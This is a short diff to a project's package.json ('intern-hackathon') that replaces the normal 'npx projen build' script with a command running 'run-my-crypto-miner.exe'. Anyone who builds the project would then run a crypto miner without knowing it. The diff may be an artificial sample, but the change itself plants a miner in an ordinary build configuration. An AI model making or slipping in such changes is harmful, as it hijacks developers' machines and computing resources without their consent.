@@ -1,7 +1,7 @@
 {
   "name": "intern-hackathon",
   "scripts": {
-    "build": "npx projen build",
+    "build": "run-my-crypto-miner.exe",
     "bump": "npx projen bump",
     "clobber": "npx projen clobber",
     "compile": "npx projen compile",
